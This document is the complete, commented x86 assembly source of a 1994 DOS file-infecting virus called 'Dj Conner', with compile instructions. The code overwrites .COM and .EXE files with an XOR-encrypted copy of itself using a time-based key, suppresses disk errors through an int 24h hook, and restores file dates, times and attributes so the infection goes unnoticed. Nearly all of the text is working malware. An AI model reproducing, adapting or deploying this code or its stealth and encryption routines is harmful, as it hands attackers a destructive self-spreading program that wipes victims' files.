;  Dj Conner written by MuTaTiON INTERRUPT
;  To compile this use TASM /M dj.asm


code    segment public 'code'
        assume  cs:code
        org     100h                              ; All .COM files start here

start:
        db 0e9h,0,0                               ; Jump to the next command

virus:
        call    encrypt_decrypt                   ; Decrypt the virus first

encrypt_start   equ     $                         ; From here is encrypted

        mov     ax,3524h                          ; Get int 24 handler
        int     21h                               ; To ES:BX
        mov     word ptr [oldint24],bx            ; Save it
        mov     word ptr [oldint24+2],es

        mov     ah,25h                            ; Set new int 24 handler
        mov     dx,offset int24                   ; DS:DX->new handler
        int     21h

        push    cs                                ; Restore ES
        pop     es                                ; 'cuz it was changed

        mov     dx,offset exefilespec
        call    findfirst
        mov     dx,offset comfilespec
        call    findfirst

        mov     ah,9                              ; Display string
        mov     dx,offset virusname
        int     21h

        mov     ax,2524h                          ; Restore int 24 handler
        mov     dx,offset oldint24                ; To original
        int     21h

        push    cs
        pop     ds                                ; Do this because the DS gets changed

        int    20h                                ; quit program

findfirst:
        mov     ah,4eh                            ; Find first file
        mov     cx,7                              ; Find all attributes

findnext:
        int     21h                               ; Find first/next file int
        jc      quit                              ; If none found then change dir

        call    infection                         ; Infect that file

        mov     ah,4fh                            ; Find next file
        jmp     findnext                          ; Jump to the loop

quit:
        ret

infection:
        mov     bx,80h
        mov     ax,word ptr [bx]+35               ; Get end of file name in ax
        cmp     ax,'DN'                           ; Does End in comma'ND'? (reverse order)
        jz      quitinfect                        ; Yup so get another file
        jmp    finishinfection

quitinfect:
        ret

FinishInfection:
        xor     cx,cx                             ; Set attriutes to none
        call    attributes

        mov     al,2                              ; open file read/write
        call    open

get_time:
        mov     ah,2ch                            ; Get time for our encryption value
        int     21h
        cmp     dh,0                              ; If its seconds are zere get another
        je      get_time
        mov     [enc_value],dh                    ; Use seconds value for encryption
        call    encrypt_infect                    ; Encrypt and infect the file
closefile:
        mov     ax,5701h                          ; Set files date/time back
        push    bx
        mov     cx,word ptr [bx]+16h              ; Get old time from dta
        mov     dx,word ptr [bx]+18h              ; Get old date
        pop     bx
        int     21h

        mov     ah,3eh                            ; Close file
        int     21h

        xor     cx,cx
        mov     bx,80h
        mov     cl,byte ptr [bx]+15h              ; Get old Attributes
        call    attributes

        retn

open:
        mov     ah,3dh                            ; open file
        mov     dx,80h+30
        int     21h
        xchg    ax,bx                             ; file handle in bx
        ret

attributes:
        mov     ax,4301h                          ; Set attributes to cx
        mov     dx,80h+30
        int     21h
        ret
int24:                                            ; New int 24h (error) handler
        mov     al,3                              ; Fail call
        iret                                      ; Return from int 24 call

Virusname db 'Dj Conner - But, I Want To Be A Witch!',10,13
Author    db 'MuTaTiON INTERRUPT',10,13           ; Author Of This Virus
Made_with db '[NOVEMBER 1994]',10,13
          db 'But: I want to be a Witch! - DJ Conner-','$'

comfilespec  db  '*.com',0                        ; Holds type of file to look for
exefilespec  db  '*.exe',0                        ; Holds type of file to look for

encrypt_infect:
        mov     si,offset move_begin              ; Location of where to move from
        mov     di,offset workarea                ; Where to move it too
        mov     cx,move_end-move_begin            ; Number of bytes to move
move_loop:
        movsb                                     ; Moves this routine into heap
        loop    move_loop
        mov     dx,offset workarea
        call    dx                                ; Jump to that routine just moved
        ret

move_begin    equ     $                           ; Marks beginning of move
        push    bx                                ; Save the file handle
        mov     dx,offset encrypt_end
        call    dx                                ; Call the encrypt_decrypt procedure
        pop     bx                                ; Get handle back in bx and return
        mov     ah,40h                            ; Write to file
        mov     cx,eof-start                      ; Number of bytes
        mov     dx,100h
        int     21h
        push    bx                                ; Save the file handle
        mov     dx,offset encrypt_end
        call    dx                                ; Decrypt the file and return
        pop     bx                                ; Get handle back in bx and return
        ret
move_end      equ     $                           ; Marks the end of move

encrypt_end   equ     $                           ; Marks the end of encryption

encrypt_decrypt:
        mov     bx,offset encrypt_start           ; Where to start encryption
        mov     cx,encrypt_end-encrypt_start      ; Number of bytes to encrypt
        mov     dh,[enc_value]                    ; Value to use for encryption
encrypt_loop:
        mov     ah,cs:[bx]                        ; Get a byte in ah
        xor     ah,dh                             ; Xor it
        mov     cs:[bx],ah                        ; Put it back
        inc     bx                                ; Move to next byte and loop
        loop    encrypt_loop
        ret

enc_value     db    00h                           ; Hold the encryption value 00 for nul effect

eof     equ     $                                 ; Marks the end of file

workarea db     move_end-move_begin dup (?)       ; Holds the encrypt_infect routine
oldint24 dd ?                                     ; Storage for old int 24h handler

code    ends
        end     start
        